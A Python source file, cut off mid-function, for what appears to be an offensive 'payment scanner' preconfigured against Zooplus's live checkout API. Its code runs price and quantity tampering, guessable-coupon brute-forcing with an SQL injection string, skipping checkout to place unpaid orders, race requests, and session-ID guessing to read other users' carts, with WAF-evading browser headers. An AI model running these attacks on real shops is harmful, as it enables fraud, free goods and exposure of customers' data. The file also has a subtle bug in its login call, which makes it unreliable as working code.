"""
BEATRIX Payment & Checkout Scanner

Born from: Zooplus engagement (2025-07-17)
Full checkout API reverse-engineered from minified JS bundles.
Discovered separate Shop (Next.js) and Checkout (React SPA) frontends
with distinct API surfaces. Mapped 20+ state-api endpoints, URL patterns,
required headers (X-Checkout-Page-Id), and HTTP method mappings.

TECHNIQUE:
1. Authenticate with target's auth system (Keycloak, OAuth, etc.)
2. Map checkout flow stages (cart → preview → finish)
3. Test price manipulation, quantity tampering, coupon abuse
4. Test IDOR via session identifiers
5. Race condition testing on checkout finalization
6. Payment method bypass / free order attempts

OWASP: A01:2021 - Broken Access Control (payment bypass = critical BAC)
       A04:2021 - Insecure Design (logic flaws in checkout)
       A08:2021 - Software and Data Integrity Failures (price tampering)

CWE: CWE-425 (Direct Request / Forced Browsing)
     CWE-639 (Authorization Bypass Through User-Controlled Key)
     CWE-770 (Allocation of Resources Without Limits - race conditions)
     CWE-20  (Improper Input Validation - negative quantities/prices)
"""

import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, AsyncIterator, Dict, List, Optional, Tuple
from urllib.parse import urljoin

import httpx

from beatrix.core.types import Confidence, Finding, Severity
from beatrix.scanners.base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class CheckoutStage(Enum):
    """Checkout flow stages"""
    CART = "cart"
    PREVIEW = "preview"
    FINISH = "finish"
    GUEST_PREVIEW = "guest-preview"
    NONE = "none"


class PaymentAttackType(Enum):
    """Classes of payment/checkout attacks"""
    PRICE_MANIPULATION = auto()
    QUANTITY_TAMPERING = auto()
    COUPON_ABUSE = auto()
    RACE_CONDITION = auto()
    PAYMENT_BYPASS = auto()
    IDOR_SESSION = auto()
    STAGE_SKIP = auto()
    FREE_SAMPLE_ABUSE = auto()
    SUBSCRIPTION_MANIPULATION = auto()
    GUEST_CHECKOUT_ABUSE = auto()
    DISCOUNT_STACKING = auto()
    CURRENCY_CONFUSION = auto()


@dataclass
class CheckoutEndpoint:
    """A discovered checkout API endpoint"""
    path: str
    method: str  # GET, POST, PUT, PATCH, DELETE
    stage: Optional[str] = None  # cart, preview, etc.
    requires_auth: bool = True
    requires_csrf: bool = True
    body_schema: Optional[Dict[str, Any]] = None
    description: str = ""
    attack_types: List[PaymentAttackType] = field(default_factory=list)


@dataclass
class CheckoutConfig:
    """Configuration for a specific target's checkout system"""
    # Base URLs
    base_url: str
    checkout_base: str = ""
    semi_protected_base: str = ""
    auth_base: str = ""

    # Auth
    login_url: str = ""
    login_method: str = "POST"
    credentials: Dict[str, str] = field(default_factory=dict)

    # Headers
    user_agent: str = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/137.0.0.0 Safari/537.36"
    )
    extra_headers: Dict[str, str] = field(default_factory=dict)

    # Rate limiting (CRITICAL - avoid WAF blocks)
    request_delay: float = 3.0  # seconds between requests
    burst_limit: int = 5  # max concurrent requests
    backoff_on_403: float = 60.0  # wait after 403
    max_retries: int = 3

    # Scan config
    test_product_ids: List[str] = field(default_factory=list)
    test_coupon_codes: List[str] = field(default_factory=list)

    # Endpoints (populated by discovery or manual config)
    endpoints: List[CheckoutEndpoint] = field(default_factory=list)


@dataclass
class SessionState:
    """Active session state during scanning"""
    cookies: Dict[str, str] = field(default_factory=dict)
    csrf_token: Optional[str] = None
    session_id: Optional[str] = None
    cart_version: Optional[str] = None
    checkout_page_id: str = "cart"
    is_authenticated: bool = False
    is_blocked: bool = False
    last_request_time: float = 0.0


# =============================================================================
# ZOOPLUS-SPECIFIC PRESETS
# =============================================================================

ZOOPLUS_CONFIG = CheckoutConfig(
    base_url="https://www.zooplus.com",
    checkout_base="/checkout/api/state-api",
    semi_protected_base="/semiprotected/api/checkout/state-api",
    auth_base="https://login.zooplus.com",
    login_url="https://login.zooplus.com/realms/zooplus/protocol/openid-connect/auth",
    login_method="POST",
    credentials={
        "username": "",  # Set at runtime
        "password": "",  # Set at runtime
    },
    request_delay=5.0,  # Zooplus WAF is aggressive
    burst_limit=2,
    backoff_on_403=120.0,  # CloudFront blocks last ~2-5 min
    test_product_ids=["156523", "128238", "318614", "999078", "128123"],
    endpoints=[
        # Cart Version (confirmed working)
        CheckoutEndpoint(
            path="/cart-version",
            method="GET",
            stage=None,
            requires_auth=False,
            requires_csrf=False,
            description="Get cart API version",
        ),
        # Cart Operations
        CheckoutEndpoint(
            path="/get",
            method="GET",
            stage="cart",
            description="Get full checkout state",
            attack_types=[PaymentAttackType.IDOR_SESSION],
        ),
        CheckoutEndpoint(
            path="/set-article-quantity",
            method="PUT",
            stage="cart",
            body_schema={
                "articleId": "int",
                "quantity": "int",
                "voucherChannel": "optional",
                "voucherApplied": "optional",
                "subscriptionSelected": "optional",
                "offerIds": "optional_array",
            },
            description="Add/change article quantity in cart",
            attack_types=[
                PaymentAttackType.QUANTITY_TAMPERING,
                PaymentAttackType.PRICE_MANIPULATION,
            ],
        ),
        CheckoutEndpoint(
            path="/add-coupon",
            method="PATCH",
            stage="cart",
            body_schema={"couponCode": "string"},
            description="Apply coupon code",
            attack_types=[
                PaymentAttackType.COUPON_ABUSE,
                PaymentAttackType.DISCOUNT_STACKING,
            ],
        ),
        CheckoutEndpoint(
            path="/remove-coupon",
            method="DELETE",
            stage="cart",
            description="Remove coupon",
        ),
        CheckoutEndpoint(
            path="/set-saving-plan-article",
            method="PUT",
            stage="cart",
            description="Set savings plan article",
            attack_types=[PaymentAttackType.SUBSCRIPTION_MANIPULATION],
        ),
        CheckoutEndpoint(
            path="/set-free-sample-article",
            method="PUT",
            stage="cart",
            body_schema={"articleId": "int"},
            description="Set free sample article",
            attack_types=[PaymentAttackType.FREE_SAMPLE_ABUSE],
        ),
        CheckoutEndpoint(
            path="/set-cart-subscription-details/{interval}",
            method="PATCH",
            stage="cart",
            description="Set subscription delivery interval",
            attack_types=[PaymentAttackType.SUBSCRIPTION_MANIPULATION],
        ),
        CheckoutEndpoint(
            path="/convert-cart-to-single-delivery",
            method="DELETE",
            stage="cart",
            description="Remove subscription from cart",
        ),
        CheckoutEndpoint(
            path="/change-shipping-country/{country}/{zipCode}",
            method="PUT",
            stage="cart",
            description="Change shipping country",
            attack_types=[PaymentAttackType.CURRENCY_CONFUSION],
        ),
        # Customer / Guest Operations
        CheckoutEndpoint(
            path="/customer/basic-guest-customer",
            method="POST",
            stage="cart",
            body_schema={
                "email": "string",
                "firstName": "string",
                "lastName": "string",
            },
            description="Create basic guest account",
            attack_types=[PaymentAttackType.GUEST_CHECKOUT_ABUSE],
        ),
        # Payment Operations
        CheckoutEndpoint(
            path="/payment/method/preferred",
            method="PATCH",
            stage="preview",
            description="Update preferred payment method",
            attack_types=[PaymentAttackType.PAYMENT_BYPASS],
        ),
        CheckoutEndpoint(
            path="/payment/card/{pspIdentifier}",
            method="DELETE",
            stage="preview",
            description="Delete saved payment card",
            attack_types=[PaymentAttackType.IDOR_SESSION],
        ),
        CheckoutEndpoint(
            path="/payment/bancontact/{bancontactIdentifier}",
            method="DELETE",
            stage="preview",
            description="Delete saved Bancontact payment",
            attack_types=[PaymentAttackType.IDOR_SESSION],
        ),
        # Auth Cookies
        CheckoutEndpoint(
            path="/v2/delete-auth-cookies",
            method="DELETE",
            stage=None,
            requires_csrf=False,
            description="Delete auth cookies (logout-like)",
        ),
        # Checkout Finalization
        CheckoutEndpoint(
            path="/checkout/place-order",
            method="POST",
            stage="finish",
            description="Place final order",
            attack_types=[
                PaymentAttackType.PAYMENT_BYPASS,
                PaymentAttackType.STAGE_SKIP,
                PaymentAttackType.RACE_CONDITION,
            ],
        ),
        CheckoutEndpoint(
            path="/checkout/guest-preview",
            method="GET",
            stage="guest-preview",
            description="Guest checkout preview",
            attack_types=[PaymentAttackType.GUEST_CHECKOUT_ABUSE],
        ),
    ],
)


# =============================================================================
# PAYMENT SCANNER
# =============================================================================

class PaymentScanner(BaseScanner):
    """
    Payment & Checkout Flow Scanner

    Tests for business logic vulnerabilities in e-commerce checkout flows.
    This is where the money is — literally. Payment bypass = critical severity.

    Attack Vectors:
    1. Price Manipulation  — tamper price fields in API requests
    2. Quantity Tampering  — negative/zero/overflow quantities
    3. Coupon Abuse        — reuse, stack, brute-force coupons
    4. Race Conditions     — concurrent checkout requests
    5. Payment Bypass      — skip payment step, manipulate method
    6. IDOR via Session    — access other users' carts/orders
    7. Stage Skipping      — jump from cart to finish without payment
    8. Free Sample Abuse   — exploit free sample feature
    9. Subscription Manip  — abuse subscription pricing
    10. Currency Confusion — exploit country/currency switching

    CRITICAL: This scanner uses aggressive rate limiting by default.
    WAFs (especially CloudFront) will block you if you go too fast.
    """

    name = "payment"
    description = "Payment & Checkout Flow Scanner"
    author = "BEATRIX"
    version = "1.0.0"

    checks = [
        "price_manipulation",
        "quantity_tampering",
        "coupon_abuse",
        "race_condition_checkout",
        "payment_method_bypass",
        "session_idor",
        "checkout_stage_skip",
        "free_sample_abuse",
        "subscription_manipulation",
        "currency_confusion",
    ]

    owasp_category = "A04:2021 - Insecure Design"
    mitre_technique = "T1565.002"  # Data Manipulation: Transmitted Data

    def __init__(
        self,
        config: Optional[CheckoutConfig] = None,
        preset: Optional[str] = None,
    ):
        """
        Initialize payment scanner.

        Args:
            config: Target-specific checkout config
            preset: Preset name ("zooplus", etc.) - loads preconfigured endpoints
        """
        # Load preset or use provided config
        if preset == "zooplus":
            self.checkout_config = ZOOPLUS_CONFIG
        elif config:
            self.checkout_config = config
        else:
            self.checkout_config = CheckoutConfig(base_url="")

        super().__init__(config={
            "rate_limit": self.checkout_config.burst_limit,
            "timeout": 30,
        })

        self.state = SessionState()
        self.findings: List[Finding] = []
        self._request_count = 0
        self._block_count = 0

    async def __aenter__(self):
        """Setup HTTP client with WAF-evasion headers"""
        self.client = httpx.AsyncClient(
            timeout=30,
            follow_redirects=False,  # Manual redirect handling
            verify=False,
            headers={
                "User-Agent": self.checkout_config.user_agent,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                **self.checkout_config.extra_headers,
            },
        )
        return self

    async def __aexit__(self, *args):
        if self.client:
            await self.client.aclose()

    # =========================================================================
    # RATE-LIMITED REQUEST LAYER
    # =========================================================================

    async def _throttled_request(
        self,
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        json_body: Optional[Dict[str, Any]] = None,
        cookies: Optional[Dict[str, str]] = None,
        allow_redirects: bool = False,
    ) -> Optional[httpx.Response]:
        """
        Make a rate-limited, WAF-aware request.

        - Enforces minimum delay between requests
        - Backs off on 403 (WAF block)
        - Tracks request count for rate limiting
        - Returns None if blocked
        """
        if self.state.is_blocked:
            self.log(f"[BLOCKED] Skipping request to {url}")
            return None

        # Enforce rate limit
        elapsed = time.time() - self.state.last_request_time
        if elapsed < self.checkout_config.request_delay:
            wait = self.checkout_config.request_delay - elapsed
            await asyncio.sleep(wait)

        # Build headers
        req_headers = {
            "Content-Type": "application/json",
            "X-Checkout-Page-Id": self.state.checkout_page_id,
        }
        if self.state.csrf_token:
            req_headers["X-CSRF-Token"] = self.state.csrf_token
        if headers:
            req_headers.update(headers)

        # Build cookies
        req_cookies = dict(self.state.cookies)
        if cookies:
            req_cookies.update(cookies)

        self._request_count += 1
        self.state.last_request_time = time.time()

        try:
            resp = await self.client.request(
                method=method,
                url=url,
                headers=req_headers,
                json=json_body,
                cookies=req_cookies if req_cookies else None,
                follow_redirects=allow_redirects,
            )

            # Check for WAF block
            if resp.status_code == 403:
                self._block_count += 1
                if self._block_count >= 3:
                    self.state.is_blocked = True
                    self.log(
                        f"[WAF] Blocked after {self._request_count} requests. "
                        f"Backing off {self.checkout_config.backoff_on_403}s"
                    )
                    await asyncio.sleep(self.checkout_config.backoff_on_403)
                    self.state.is_blocked = False
                    self._block_count = 0
                else:
                    self.log(
                        f"[WAF] 403 received ({self._block_count}/3). "
                        f"Slowing down..."
                    )
                    await asyncio.sleep(self.checkout_config.request_delay * 3)

            return resp

        except (httpx.TimeoutException, httpx.ConnectError) as e:
            self.log(f"[ERROR] Request failed: {e}")
            return None

    # =========================================================================
    # CONVENIENCE REQUEST METHODS
    # =========================================================================

    async def _checkout_request(
        self,
        endpoint: CheckoutEndpoint,
        base: str = "semi",
        body: Optional[Dict[str, Any]] = None,
        path_params: Optional[Dict[str, str]] = None,
        extra_headers: Optional[Dict[str, str]] = None,
    ) -> Optional[httpx.Response]:
        """
        Make a request to a checkout endpoint using proper URL construction.

        URL pattern: {base_url}{api_base}/{cartVersion}/{action}

        CRITICAL: The path segment after api_base is the CART VERSION (e.g. "v2"),
        NOT the checkout stage. The stage ("cart", "preview", etc.) is only sent
        via the X-Checkout-Page-Id header.

        Discovered 2025-07-18 from checkout bundle analysis:
          E(action, t, method, body, csrf) where t = cartVersion ("v2")
          getState: async e => await E(o.nC.GET, e) called as _.getState(cartVersion)
        """
        cfg = self.checkout_config

        # Select API base
        if base == "semi":
            api_base = cfg.semi_protected_base
        elif base == "auth":
            api_base = cfg.auth_base if cfg.auth_base.startswith("/") else cfg.checkout_base
        else:
            api_base = cfg.checkout_base

        # Build path with any path params
        path = endpoint.path
        if path_params:
            for k, v in path_params.items():
                path = path.replace(f"{{{k}}}", v)

        # Use cart version in URL, NOT stage
        # cart-version endpoint has no version prefix
        version = self.state.cart_version or "v2"
        if endpoint.path == "/cart-version":
            url = f"{cfg.base_url}{api_base}{path}"
        else:
            url = f"{cfg.base_url}{api_base}/{version}{path}"

        # Set checkout page ID header to match stage (NOT in URL)
        if endpoint.stage:
            self.state.checkout_page_id = endpoint.stage

        return await self._throttled_request(
            method=endpoint.method,
            url=url,
            json_body=body,
            headers=extra_headers,
        )

    # =========================================================================
    # AUTH HELPERS
    # =========================================================================

    async def authenticate_keycloak(
        self,
        username: str,
        password: str,
        realm: str = "zooplus",
        client_id: str = "shop-myzooplus-prod-zooplus",
    ) -> bool:
        """
        Authenticate via Keycloak OpenID Connect.

        Flow:
        1. GET auth URL → get login form
        2. POST credentials → get redirect with code
        3. Follow redirects → get session cookies
        4. Extract CSRF from cookies
        """
        if not self.client:
            self.log("[AUTH] Client not initialized")
            return False

        cfg = self.checkout_config

        # Step 1: Get login page
        auth_url = (
            f"https://login.zooplus.com/realms/{realm}/"
            f"protocol/openid-connect/auth?"
            f"client_id={client_id}&"
            f"redirect_uri={cfg.base_url}/sso/auth/code&"
            f"response_type=code&scope=openid"
        )

        self.log("[AUTH] Fetching login page...")
        resp = await self._throttled_request("GET", auth_url, allow_redirects=True)
        if not resp:
            return False

        # Parse form action URL from response
        action_match = re.search(r'action="([^"]+)"', resp.text)
        if not action_match:
            self.log("[AUTH] Could not find login form action")
            return False

        form_url = action_match.group(1).replace("&amp;", "&")

        # Step 2: Submit credentials
        self.log("[AUTH] Submitting credentials...")
        login_resp = await self._throttled_request(
            "POST",
            form_url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            content=f"username={username}&password={password}",
            allow_redirects=False,
        )
        if not login_resp:
            return False

        # Step 3: Follow redirect chain to get session cookies
        if login_resp.status_code in (301, 302, 303):
            redirect_url = login_resp.headers.get("location", "")
            if not redirect_url.startswith("http"):
                redirect_url = urljoin(cfg.base_url, redirect_url)

            # Follow redirects, collecting cookies
            for _ in range(5):
                resp = await self._throttled_request(
                    "GET", redirect_url, allow_redirects=False,
                )
                if not resp:
                    break

                # Collect cookies
                for cookie_name, cookie_value in resp.cookies.items():
                    self.state.cookies[cookie_name] = cookie_value

                if resp.status_code in (301, 302, 303):
                    redirect_url = resp.headers.get("location", "")
                    if not redirect_url.startswith("http"):
                        redirect_url = urljoin(cfg.base_url, redirect_url)
                else:
                    break

        # Step 4: Extract CSRF token
        csrf = self.state.cookies.get("csrf_token") or self.state.cookies.get("CSRF-TOKEN")
        if csrf:
            self.state.csrf_token = csrf

        # Check if we have session cookies
        has_session = any(
            k.lower() in ("sid", "session", "jsessionid", "connect.sid")
            or "sess" in k.lower()
            for k in self.state.cookies
        )

        self.state.is_authenticated = has_session or bool(csrf)

        if self.state.is_authenticated:
            self.log(f"[AUTH] Authenticated. Cookies: {list(self.state.cookies.keys())}")
            if csrf:
                self.log("[AUTH] CSRF token obtained")
        else:
            self.log("[AUTH] Authentication may have failed — no session cookies found")

        return self.state.is_authenticated

    # =========================================================================
    # DISCOVERY
    # =========================================================================

    async def discover_cart_version(self) -> Optional[str]:
        """Check cart API version — lightweight connectivity test"""
        cfg = self.checkout_config
        url = f"{cfg.base_url}{cfg.semi_protected_base}/cart-version"

        resp = await self._throttled_request("GET", url)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                self.state.cart_version = data.get("version", "unknown")
                self.log(f"[DISCOVER] Cart version: {self.state.cart_version}")
                return self.state.cart_version
            except Exception:
                pass
        return None

    async def discover_checkout_state(self) -> Optional[Dict[str, Any]]:
        """
        Retrieve full checkout state using discovered cart version.

        URL pattern: {base_url}{api_base}/{cartVersion}/get
        The cartVersion (e.g. "v2") is obtained from /cart-version endpoint.

        Returns the full state including: togglesAndExperiments, stateAttributes
        (csrfToken, supportedCountries, keycloakData), customer, payment,
        delivery, cart, autoshipment, placeOrderConfig.
        """
        cfg = self.checkout_config

        # Ensure we have the cart version
        if not self.state.cart_version:
            await self.discover_cart_version()

        version = self.state.cart_version or "v2"
        url = f"{cfg.base_url}{cfg.semi_protected_base}/{version}/get"

        resp = await self._throttled_request("GET", url)
        if resp and resp.status_code == 200:
            self.log(f"[DISCOVER] State endpoint found: {url}")
            try:
                data = resp.json()

                # Extract CSRF token and session data
                attrs = data.get("stateAttributes", {})
                if "csrfToken" in attrs:
                    self.state.csrf_token = attrs["csrfToken"]
                    self.log("[DISCOVER] CSRF token obtained from state")

                cart = data.get("cart", {})
                if cart.get("sid"):
                    self.state.session_id = cart["sid"]
                    self.log(f"[DISCOVER] Session ID: {self.state.session_id}")

                # Store cookies from response
                if hasattr(resp, 'cookies'):
                    for name, value in resp.cookies.items():
                        self.state.cookies[name] = value

                return data
            except Exception:
                return {"raw": resp.text[:500]}
        elif resp:
            self.log(f"[DISCOVER] State endpoint {url} → {resp.status_code}")

        return None

    # =========================================================================
    # ATTACK MODULES
    # =========================================================================

    async def test_quantity_tampering(
        self,
        article_id: int,
    ) -> AsyncIterator[Finding]:
        """
        Test: Can we set negative, zero, or absurdly large quantities?

        Vectors:
        - quantity: -1  → negative price?
        - quantity: 0   → free item in cart?
        - quantity: 999999 → integer overflow?
        - quantity: 0.5 → floating point accepted?
        """
        self.state.checkout_page_id = "cart"

        test_quantities = [
            (-1, "negative quantity"),
            (0, "zero quantity"),
            (-999, "large negative"),
            (999999, "integer overflow attempt"),
            (2147483647, "INT_MAX overflow"),
            (2147483648, "INT_MAX+1 overflow"),
        ]

        # Find the set-article-quantity endpoint
        endpoint = self._find_endpoint("/set-article-quantity")
        if not endpoint:
            self.log("[QUANTITY] No set-article-quantity endpoint configured")
            return

        for qty, desc in test_quantities:
            body = {
                "articleId": article_id,
                "quantity": qty,
            }

            resp = await self._checkout_request(endpoint, body=body)
            if not resp:
                continue

            # Analyze response
            if resp.status_code == 200:
                yield self.create_finding(
                    title=f"Quantity Tampering: {desc} accepted",
                    severity=Severity.HIGH if qty < 0 else Severity.MEDIUM,
                    confidence=Confidence.FIRM,
                    url=str(resp.url),
                    description=(
                        f"The checkout API accepted a {desc} (quantity={qty}) "
                        f"for article {article_id}. This may allow price manipulation "
                        f"or cart state corruption."
                    ),
                    evidence=f"Status: {resp.status_code}\nBody: {resp.text[:500]}",
                    request=f"PUT {resp.url}\n{json.dumps(body, indent=2)}",
                    response=f"{resp.status_code}\n{resp.text[:500]}",
                )
            elif resp.status_code not in (400, 422, 404):
                self.log(f"[QUANTITY] Unexpected: {desc} → {resp.status_code}")

    async def test_price_manipulation(
        self,
        article_id: int,
    ) -> AsyncIterator[Finding]:
        """
        Test: Can we add arbitrary fields to control price?

        Vectors:
        - Add price/unitPrice/totalPrice fields to body
        - Add discount/reduction fields
        - Send negative price values
        """
        self.state.checkout_page_id = "cart"

        endpoint = self._find_endpoint("/set-article-quantity")
        if not endpoint:
            return

        price_injections = [
            ({"price": 0.01}, "price field injection (0.01)"),
            ({"price": 0}, "zero price injection"),
            ({"price": -10}, "negative price injection"),
            ({"unitPrice": 0.01}, "unitPrice override"),
            ({"totalPrice": 0.01}, "totalPrice override"),
            ({"discount": 99.99}, "discount field injection"),
            ({"reduction": 100}, "100% reduction"),
            ({"amount": 0.01}, "amount override"),
            ({"priceOverride": 1}, "priceOverride field"),
            ({"salePrice": 0.01}, "salePrice injection"),
        ]

        for extra_fields, desc in price_injections:
            body = {
                "articleId": article_id,
                "quantity": 1,
                **extra_fields,
            }

            resp = await self._checkout_request(endpoint, body=body)
            if not resp:
                continue

            if resp.status_code == 200:
                # Check if the response shows the manipulated price
                try:
                    resp_data = resp.json()
                    resp_text = json.dumps(resp_data)
                except Exception:
                    resp_text = resp.text

                yield self.create_finding(
                    title=f"Price Manipulation: {desc}",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.TENTATIVE,
                    url=str(resp.url),
                    description=(
                        f"The checkout API accepted a request with additional "
                        f"price-related fields: {extra_fields}. Verify if the total "
                        f"was actually affected by checking the cart state."
                    ),
                    evidence=f"Request accepted with fields: {extra_fields}",
                    request=f"PUT {resp.url}\n{json.dumps(body, indent=2)}",
                    response=f"{resp.status_code}\n{resp_text[:500]}",
                )

    async def test_coupon_abuse(self) -> AsyncIterator[Finding]:
        """
        Test: Coupon stacking, reuse, and brute-force.

        Vectors:
        - Apply same coupon twice
        - Apply multiple different coupons
        - Common coupon patterns (WELCOME10, SAVE20, etc.)
        - Empty/null coupon code
        - SQL injection in coupon field
        """
        self.state.checkout_page_id = "cart"

        add_coupon = self._find_endpoint("/add-coupon")
        remove_coupon = self._find_endpoint("/remove-coupon")

        if not add_coupon:
            self.log("[COUPON] No add-coupon endpoint configured")
            return

        # Common coupon patterns
        test_coupons = [
            "WELCOME10",
            "WELCOME",
            "SAVE20",
            "NEWCUSTOMER",
            "FIRSTORDER",
            "FREE",
            "FREESHIP",
            "DISCOUNT",
            "TEST",
            "PROMO",
            "%00",  # null byte
            "' OR '1'='1",  # SQLi
            "WELCOME10\nWELCOME20",  # newline injection
        ] + self.checkout_config.test_coupon_codes

        working_coupons = []

        for code in test_coupons:
            body = {"couponCode": code}
            resp = await self._checkout_request(add_coupon, body=body)
            if not resp:
                continue

            if resp.status_code == 200:
                working_coupons.append(code)
                self.log(f"[COUPON] Code accepted: {code}")

                yield self.create_finding(
                    title=f"Coupon code accepted: {code}",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.FIRM,
                    url=str(resp.url),
                    description=(
                        f"The coupon code '{code}' was accepted by the API. "
                        f"If this is a guessable/common pattern, it indicates "
                        f"weak coupon generation."
                    ),
                    evidence=f"Coupon '{code}' → 200 OK",
                    request=f"PATCH {resp.url}\n{json.dumps(body)}",
                    response=f"{resp.status_code}\n{resp.text[:300]}",
                )

        # Test coupon stacking (if we found working coupons)
        if len(working_coupons) >= 2:
            # Apply first coupon
            await self._checkout_request(add_coupon, body={"couponCode": working_coupons[0]})
            await asyncio.sleep(self.checkout_config.request_delay)

            # Try applying second without removing first
            resp = await self._checkout_request(add_coupon, body={"couponCode": working_coupons[1]})
            if resp and resp.status_code == 200:
                yield self.create_finding(
                    title="Coupon Stacking: Multiple coupons accepted",
                    severity=Severity.HIGH,
                    confidence=Confidence.FIRM,
                    url=str(resp.url),
                    description=(
                        f"Multiple coupon codes ({working_coupons[0]}, "
                        f"{working_coupons[1]}) were accepted simultaneously, "
                        f"enabling discount stacking."
                    ),
                    evidence=f"Coupons stacked: {working_coupons[:2]}",
                )

        # Test reuse: apply, remove, re-apply
        if working_coupons and remove_coupon:
            code = working_coupons[0]
            # Remove it
            await self._checkout_request(remove_coupon)
            await asyncio.sleep(self.checkout_config.request_delay)
            # Re-apply
            resp = await self._checkout_request(add_coupon, body={"couponCode": code})
            if resp and resp.status_code == 200:
                self.log(f"[COUPON] Reuse permitted: {code}")

    async def test_stage_skipping(self) -> AsyncIterator[Finding]:
        """
        Test: Can we skip from cart directly to place-order?

        This is the big one. If checkout stages aren't enforced server-side,
        we can skip payment entirely.
        """
        place_order = self._find_endpoint("/checkout/place-order")
        guest_preview = self._find_endpoint("/checkout/guest-preview")

        # Try placing order directly from cart stage
        if place_order:
            self.state.checkout_page_id = "cart"  # Wrong stage deliberately

            resp = await self._checkout_request(place_order)
            if resp and resp.status_code == 200:
                yield self.create_finding(
                    title="Checkout Stage Skip: Place order from cart",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.CERTAIN,
                    url=str(resp.url),
                    description=(
                        "Successfully called place-order endpoint directly from "
                        "cart stage without going through preview/payment. This is "
                        "a critical payment bypass vulnerability."
                    ),
                    evidence=f"Status: {resp.status_code}\nBody: {resp.text[:500]}",
                )
            elif resp:
                self.log(f"[STAGE-SKIP] place-order from cart → {resp.status_code}")

        # Try accessing guest-preview as authenticated user
        if guest_preview:
            self.state.checkout_page_id = "guest-preview"
            resp = await self._checkout_request(guest_preview)
            if resp and resp.status_code == 200 and self.state.is_authenticated:
                yield self.create_finding(
                    title="Guest preview accessible as authenticated user",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.FIRM,
                    url=str(resp.url),
                    description=(
                        "An authenticated user can access the guest-preview "
                        "endpoint. This might bypass normal checkout restrictions."
                    ),
                    evidence=f"Status: {resp.status_code}",
                )

    async def test_race_condition(
        self,
        article_id: int,
        num_concurrent: int = 5,
    ) -> AsyncIterator[Finding]:
        """
        Test: Race conditions on checkout finalization.

        Send multiple concurrent place-order or apply-coupon requests.
        If state isn't properly locked, this can lead to:
        - Double spending of coupons
        - Multiple orders from a single checkout
        - Inconsistent cart state
        """
        endpoint = self._find_endpoint("/checkout/place-order")
        if not endpoint:
            endpoint = self._find_endpoint("/set-article-quantity")

        if not endpoint:
            self.log("[RACE] No suitable endpoint for race testing")
            return

        cfg = self.checkout_config

        # For race conditions, we need to fire requests simultaneously
        # Temporarily bypass rate limiting
        body = {"articleId": article_id, "quantity": 1} if "quantity" in str(endpoint.body_schema) else None

        async def fire_request(idx: int) -> Tuple[int, Optional[httpx.Response]]:
            """Single request in the race"""
            resp = await self._checkout_request(endpoint, body=body)
            return (idx, resp)

        # Fire all at once
        self.log(f"[RACE] Firing {num_concurrent} concurrent requests...")
        tasks = [fire_request(i) for i in range(num_concurrent)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Analyze results
        success_count = 0
        status_codes = []
        for result in results:
            if isinstance(result, Exception):
                continue
            idx, resp = result
            if resp:
                status_codes.append(resp.status_code)
                if resp.status_code == 200:
                    success_count += 1

        if success_count > 1:
            yield self.create_finding(
                title=f"Race Condition: {success_count}/{num_concurrent} concurrent requests succeeded",
                severity=Severity.HIGH,
                confidence=Confidence.TENTATIVE,
                url=f"{cfg.base_url}{endpoint.path}",
                description=(
                    f"Sent {num_concurrent} concurrent requests to {endpoint.path}. "
                    f"{success_count} returned 200. This may indicate insufficient "
                    f"locking/synchronization in the checkout flow."
                ),
                evidence=f"Status codes: {status_codes}",
            )

    async def test_idor_session(
        self,
        other_session_ids: Optional[List[str]] = None,
    ) -> AsyncIterator[Finding]:
        """
        Test: Can we access/manipulate another user's cart via session ID?

        If session IDs are in API paths (like /cart-api/v2/cart/{sid}),
        test with different session values.
        """
        get_state = self._find_endpoint("/get")
        if not get_state:
            self.log("[IDOR] No /get endpoint configured")
            return

        # Test IDs: sequential, predictable patterns
        test_ids = other_session_ids or [
            "00000000",
            "11111111",
            "admin",
            "test",
            "guest",
            "1",
            "0",
            "-1",
        ]

        # If we have a real session ID, try incrementing/decrementing it
        if self.state.session_id:
            try:
                sid_int = int(self.state.session_id, 16)
                test_ids.extend([
                    hex(sid_int + 1)[2:],
                    hex(sid_int - 1)[2:],
                    hex(sid_int + 100)[2:],
                ])
            except ValueError:
                pass

        for test_id in test_ids:
            # Save original cookies
            original_cookies = dict(self.state.cookies)

            # Replace session cookie
            for cookie_name in list(self.state.cookies.keys()):
                if "sid" in cookie_name.lower() or "sess" in cookie_name.lower():
                    self.state.cookies[cookie_name] = test_id

            resp = await self._checkout_request(get_state)

            # Restore cookies
            self.state.cookies = original_cookies

            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    # Check if response contains different user data
                    data_str = json.dumps(data)
                    if len(data_str) > 50:  # Non-trivial response
                        yield self.create_finding(
                            title=f"IDOR: Cart state accessible with session '{test_id}'",
                            severity=Severity.CRITICAL,
                            confidence=Confidence.FIRM,
                            url=str(resp.url),
                            description=(
                                f"Accessing checkout state with a manipulated session ID "
                                f"('{test_id}') returned a valid response with data. "
                                f"This may expose other users' cart/checkout information."
                            ),
                            evidence=f"Response: {data_str[:500]}",
                        )
                except Exception:
                    pass

    async def test_free_sample_abuse(self) -> AsyncIterator[Finding]:
        """
        Test: Can we add multiple free samples or use it to discount?

        Zooplus has a /set-free-sample-article endpoint.
        What happens if we set a paid article as a free sample?
        """
        endpoint = self._find_endpoint("/set-free-sample-article")
        if not endpoint:
            return

        cfg = self.checkout_config

        for article_id in cfg.test_product_ids[:3]:
            body = {"articleId": int(article_id)}
            resp = await self._checkout_request(endpoint, body=body)

            if resp and resp.status_code == 200:
                yield self.create_finding(
